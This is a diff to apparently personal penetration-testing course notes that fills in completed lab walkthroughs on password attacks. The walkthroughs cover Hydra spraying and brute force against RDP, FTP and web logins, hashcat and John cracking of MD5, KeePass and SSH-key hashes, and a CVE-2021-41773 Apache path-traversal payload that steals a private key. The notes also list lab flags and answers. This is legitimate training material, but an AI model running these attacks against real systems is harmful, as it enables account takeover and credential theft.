@@ -96,9 +96,41 @@ hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://
 
 > 📸 Screenshot: Hydra finding valid credentials from the spray (`[3389][rdp] host: <target> login: daniel password: SuperS3cure1337#`)
 
-**Lab status:** (Q1 + Q2 hands-on)
+**Lab status: ✅ Completed**
 
-> 🚩 **Hands-on, VM spin-up required:** Password Attacks - RDP - VM #1 (spray SuperS3cure1337# against username list, find flag on desktop; then enumerate for another network service, attack as itadmin) ⬜ Pending
+**VM #1 (192.168.158.202) — password spray against RDP:**
+
+```
+# Create two-name username list
+echo -e "justin\ndaniel" > ~/rdp_users.txt
+
+# Spray single password against both accounts
+hydra -L ~/rdp_users.txt -p "SuperS3cure1337#" rdp://192.168.158.202
+# [3389][rdp] host: 192.168.158.202   login: justin   password: SuperS3cure1337#
+# [3389][rdp] host: 192.168.158.202   login: daniel   password: SuperS3cure1337#
+# Both accounts shared the same password
+
+xfreerdp /u:daniel /p:"SuperS3cure1337#" /v:192.168.158.202
+# Flag in notepad note on daniel's Desktop:
+OS{3d86fb3f4468a7d6b535ad9848297d1f}
+```
+
+**VM #1 part 2 — enumerate and attack FTP as itadmin:**
+
+```
+# Nmap reveals port 21 (FileZilla ftpd 1.4.1) alongside RDP, SMB, WinRM
+sudo nmap -sV 192.168.158.202
+
+# Dictionary attack against FTP
+hydra -l itadmin -P /usr/share/wordlists/rockyou.txt ftp://192.168.158.202
+# [21][ftp] host: 192.168.158.202   login: itadmin   password: hellokitty
+# Found in ~5 seconds
+
+ftp 192.168.158.202
+# Name: itadmin | Password: hellokitty
+# ftp> get flag.txt
+OS{f0e8a15903b5d1da0b2f228e477fb3f3}
+```
 
 #### Tags: #RDP #Hydra #PasswordSpraying #AccountLockout #Module16
 
@@ -140,9 +172,43 @@ hydra -l user -P /usr/share/wordlists/rockyou.txt <target-ip> \
 
 > 🔗 **RevShells** -- once inside a web file manager, you'll often want to escalate to a shell: [revshells.com](https://revshells.com)
 
-**Lab status:** (Q1 + Q2 hands-on)
+**Lab status: ✅ Completed (VM #1)**
 
-> 🚩 **Hands-on, VM spin-up required:** Password Attacks - HTTP POST Login Form - VM #1 (TinyFileManager, user account, rockyou.txt, find flag inside); VM #2 (admin account, identify correct password via Hydra) ⬜ Pending
+**VM #1 (192.168.158.201) — TinyFileManager, user account:**
+
+```
+hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.158.201 \
+  http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid" -t 4 -I
+# [80][http-post-form] host: 192.168.158.201   login: user   password: 121212
+# Found in ~2 minutes
+
+# Log in to http://192.168.158.201 as user/121212
+# Navigate to install.txt → view
+OS{75ec55ec1fc994abe2ff90dd09528c72}
+```
+
+> 🔧 **Hard-won lesson:** Three things that break http-post-form attacks silently:
+> 1. **Wrong username** -- the module uses `user`, not `admin`. TinyFileManager has two accounts. Check listing 4 exactly.
+> 2. **CSS class as failure indicator** -- `fm-login-page` appears in inline CSS on every page including the file manager. Hydra marks every attempt as failure and runs forever.
+> 3. **Session cookie not carried** -- the "Login failed. Invalid" string only appears when Hydra follows the redirect WITH the session cookie. A plain `curl -L` test won't show it because curl doesn't persist the session cookie between the POST and the GET. Hydra handles this automatically.
+> The working indicator (`Login failed. Invalid`) is a PHP session flash message -- it only shows on the redirected login page when the session cookie from the failed POST is carried over to the subsequent GET. Test failure indicators with Burp or a browser, not bare curl.
+
+**VM #2 (192.168.158.201) — HTTP basic authentication, admin account:**
+
+```
+# 401 Unauthorized with WWW-Authenticate: Basic realm="Restricted Content"
+curl -si http://192.168.158.201/ | head -5
+
+# HTTP basic auth: no form, no redirect, no failure string needed
+# Single request per attempt -- much faster than http-post-form
+hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://192.168.158.201/
+# [80][http-get] host: 192.168.158.201   login: admin   password: 789456
+# Found in ~2 seconds (16 threads, no redirect overhead)
+
+# Answer: 789456
+```
+
+> 🔍 **Worth remembering generally:** HTTP basic auth (`http-get`) is the fastest Hydra target -- no redirect, no session, no body parsing. Just Authorization header → 200 or 401. Identify it from the `WWW-Authenticate: Basic` header in the 401 response. HTTP form attacks (`http-post-form`) are 10-50x slower per attempt due to redirect handling and session cookies.
 
 #### Tags: #HTTPBruteForce #Hydra #BurpSuite #TinyFileManager #POSTForm #Fail2Ban #Module16
 
@@ -296,11 +362,31 @@ ls /usr/share/hashcat/rules/
 
 > 📸 Screenshot: `hashcat --stdout` output showing the mutated passwords before using them against a real hash -- confirms the rule file is doing what you expect before running a long crack
 
-**Lab status:** (Q1 + Q2 hands-on hash cracking, no VM required)
+**Lab status: ✅ Completed**
 
-> 🚩 **Hands-on (no VM, needs Hashcat):** MD5 hash `056df33e47082c77148dba529212d50a` -- create a rule to append "1@3$5" to each rockyou.txt password and crack it ⬜ Pending
+**Hash 1 -- MD5 `056df33e47082c77148dba529212d50a` -- append "1@3$5":**
 
-> 🚩 **Hands-on (no VM, needs Hashcat):** MD5 hash `19adc0e8921336d08502c039dc297ff8` -- create a rule that uppercases all letters and duplicates each rockyou.txt password and crack it ⬜ Pending
+```bash
+echo '$1 $@ $3 $$ $5' > ~/append.rule
+# Verify: echo "password" | hashcat -r ~/append.rule --stdout → password1@3$5
+
+echo "056df33e47082c77148dba529212d50a" > ~/hash1.txt
+hashcat -m 0 ~/hash1.txt /usr/share/wordlists/rockyou.txt -r ~/append.rule --force
+# 056df33e47082c77148dba529212d50a:courtney1@3$5
+# Base password: courtney
+```
+
+**Hash 2 -- MD5 `19adc0e8921336d08502c039dc297ff8` -- uppercase all + duplicate:**
+
+```bash
+echo 'ud' > ~/upper_dup.rule
+# Verify: echo "password" | hashcat -r ~/upper_dup.rule --stdout → PASSWORDPASSWORD
+
+echo "19adc0e8921336d08502c039dc297ff8" > ~/hash2.txt
+hashcat -m 0 ~/hash2.txt /usr/share/wordlists/rockyou.txt -r ~/upper_dup.rule --force
+# 19adc0e8921336d08502c039dc297ff8:BUTTERFLY5BUTTERFLY5
+# Base password: butterfly5 → BUTTERFLY5 → BUTTERFLY5BUTTERFLY5
+```
 
 #### Tags: #RuleBasedAttack #Hashcat #Wordlist #MutateWordlist #PasswordPolicy #Module16
 
@@ -390,11 +476,69 @@ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt \
 > 📸 Screenshot: Hashcat cracking the KeePass hash and revealing the master password
 > 📸 Screenshot: KeePass open with the cracked password, showing the stored credentials list
 
-**Lab status:** (Q1 + Q2 hands-on)
+**Lab status: ✅ Completed (VM #1)**
 
-> 🚩 **Hands-on, VM spin-up required:** Password Attacks - Password Manager - VM #1 (SALESWK01, RDP as jason/lab, locate KeePass database, crack it, enter password titled "User Company Password") ⬜ Pending
+**VM #1 (192.168.158.203, SALESWK01) -- jason/lab, locate and crack KeePass database:**
 
-> 🚩 **Hands-on, VM spin-up required:** Password Attacks - Password Manager - VM #2 (enumerate, gain access as user nadine, obtain password titled "flag" from password manager) ⬜ Pending
+```powershell
+# On target (PowerShell): find the .kdbx file
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+# → C:\Users\jason\Documents\Database.kdbx
+
+# Transfer to Kali via RDP drive share
+# Reconnect: xfreerdp /u:jason /p:lab /v:192.168.158.203 /drive:kali,/home/kali/
+copy C:\Users\jason\Documents\Database.kdbx \\tsclient\kali\Database.kdbx
+```
+
+```bash
+# Extract and clean the hash
+keepass2john ~/Database.kdbx > ~/keepass.hash
+sed -i 's/Database://' ~/keepass.hash
+
+# Crack with mode 13400 + rockyou-30000.rule
+hashcat -m 13400 ~/keepass.hash /usr/share/wordlists/rockyou.txt \
+  -r /usr/share/hashcat/rules/rockyou-30000.rule --force
+# $keepass$...:qwertyuiop123!
+# Cracked in 33 seconds
+```
+
+```
+# Open KeePass on SALESWK01 with master password: qwertyuiop123!
+# Entry "User Company Password": XOWV2yg3JVkYc5cOBYip
+```
+
+**VM #2 (192.168.158.227) -- enumerate, brute force nadine, crack KeePass:**
+
+```bash
+# Nmap: RDP on 3389, SMB, WinRM -- no FTP this time
+sudo nmap -sV 192.168.158.227
+
+# Brute force RDP as nadine
+hydra -l nadine -P /usr/share/wordlists/rockyou.txt rdp://192.168.158.227 -t 4
+# [3389][rdp] host: 192.168.158.227   login: nadine   password: 123abc
+# Note: "12345" showed as valid auth but not active for RDP -- 123abc was the working one
+
+# RDP with drive sharing for file transfer
+xfreerdp /u:nadine /p:123abc /v:192.168.158.227 /drive:kali,/home/kali/
+```
+
+```powershell
+# On target: find KeePass database
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+# → C:\Users\nadine\Documents\Database.kdbx
+copy C:\Users\nadine\Documents\Database.kdbx \\tsclient\kali\Database2.kdbx
+```
+
+```bash
+# Extract hash, strip prefix, crack
+keepass2john ~/Database2.kdbx | sed 's/Database2://' > ~/keepass2.hash
+hashcat -m 13400 ~/keepass2.hash /usr/share/wordlists/rockyou.txt \
+  -r /usr/share/hashcat/rules/rockyou-30000.rule --force
+# Cracked in ~3 seconds (only 1 KDF iteration vs 60 on VM #1)
+# Master password: pinkpanther1234
+
+# Open KeePass on target, entry "flag": eSGJIzUp5nrr834QZBWK
+```
 
 #### Tags: #KeePass #PasswordManager #Keepass2john #Hashcat #Module16
 
@@ -460,9 +604,92 @@ john --wordlist=ssh.passwords --rules=sshRules ssh.hash
 
 > 📸 Screenshot: `john` output showing the cracked passphrase, then the successful SSH connection using the key
 
-**Lab status:** (Q1 + Q2 hands-on)
+**Lab status: ✅ Completed (VM #1 dave)**
 
-> 🚩 **Hands-on, VM spin-up required:** Password Attacks - SSH Private Key Passphrase - VM #1 (BRUTE, port 2222, crack dave's SSH key passphrase, find flag in home directory; also find way into port 2223 as alfred using same rules) ⬜ Pending
+**VM #1 (192.168.158.201, BRUTE) -- find dave's key via TinyFileManager, crack passphrase, SSH in:**
+
+```bash
+# Nmap: port 80 (Apache), 8080 (TinyFileManager), 2222 (SSH/dave), 2223 (SSH/alfred)
+sudo nmap -sV -p- --min-rate 3000 192.168.158.201
+# Port 80 comment: "only alfred has access to the server"
+
+# TinyFileManager on 8080 -- user/121212 still works
+# Files exposed: id_rsa, note.txt
+curl -s -X POST http://192.168.158.201:8080/index.php \
+  -d "fm_usr=user&fm_pwd=121212" -c /tmp/ssh_lab.jar -L > /dev/null
+
+curl -s -b /tmp/ssh_lab.jar "http://192.168.158.201:8080/index.php?p=&dl=note.txt" -o ~/note.txt
+curl -s -b /tmp/ssh_lab.jar "http://192.168.158.201:8080/index.php?p=&dl=id_rsa" -o ~/id_rsa
+chmod 600 ~/id_rsa
+```
+
+```
+# note.txt contents:
+# Dave's password list: Window, rickc137, dave, superdave, megadave, umbrella
+# Policy: 3 numbers, capital letter, special character
+# Pattern observed: rickc137 → numbers are 137
+```
+
+```bash
+# Build targeted wordlist and JtR rule
+cat > ~/ssh.passwords << 'EOF'
+Window
+rickc137
+dave
+superdave
+megadave
+umbrella
+EOF
+
+cat > ~/ssh.rule << 'EOF'
+[List.Rules:sshRules]
+c $1 $3 $7 $!
+c $1 $3 $7 $@
+c $1 $3 $7 $#
+EOF
+sudo sh -c 'cat /home/kali/ssh.rule >> /etc/john/john.conf'
+
+# Extract hash -- $sshng$6$ confirms aes-256-ctr (Hashcat 22921 unsupported, use JtR)
+ssh2john ~/id_rsa > ~/ssh.hash
+
+# Crack with JtR (18 candidates, instant)
+john --wordlist=~/ssh.passwords --rules=sshRules ~/ssh.hash
+# Umbrella137!   (/home/kali/id_rsa)
+
+# SSH in as dave
+ssh -i ~/id_rsa -p 2222 dave@192.168.158.201
+# Passphrase: Umbrella137!
+
+dave@BRUTE:~$ cat ~/flag.txt
+OS{4947d02af9a9cfaba1fe789071990691}
+```
+
+**VM #1 port 2223 -- alfred via CVE-2021-41773 path traversal + same sshRules:**
+
+```bash
+# Apache 2.4.49 on port 80 is vulnerable to CVE-2021-41773 path traversal
+# Read alfred's private key from outside the web root
+curl --path-as-is \
+  "http://192.168.158.201/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/home/alfred/.ssh/id_rsa" \
+  -o ~/alfred_id_rsa
+chmod 600 ~/alfred_id_rsa
+
+# Dave's personal note passwords didn't work (alfred uses rockyou.txt base word)
+# Same sshRules (c $1 $3 $7 $!/@ /#) but full rockyou.txt wordlist
+ssh2john ~/alfred_id_rsa > ~/alfred_ssh.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt --rules=sshRules ~/alfred_ssh.hash
+# Superstar137!   (/home/kali/alfred_id_rsa)   -- found in 8 seconds
+
+ssh -i ~/alfred_id_rsa -p 2223 alfred@192.168.158.201
+# Passphrase: Superstar137!
+
+alfred@e186d6938d7f:~$ ls
+# 123_flag.txt  (not flag.txt -- always ls first)
+alfred@e186d6938d7f:~$ cat 123_flag.txt
+OS{0a4daf26c57e4442197bb22a9cdc13e2}
+```
+
+> 🔍 **Worth remembering generally:** CVE-2021-41773 affects Apache 2.4.49 specifically. The path traversal payload `cgi-bin/.%2e/%2e%2e/...` escapes the document root. Useful any time you see Apache 2.4.49 exposed -- immediately check for readable sensitive files like SSH keys, /etc/passwd, and /etc/shadow.
 
 #### Tags: #SSHPrivateKey #Ssh2john #JohnTheRipper #Hashcat #Passphrase #AES256CTR #Module16
 
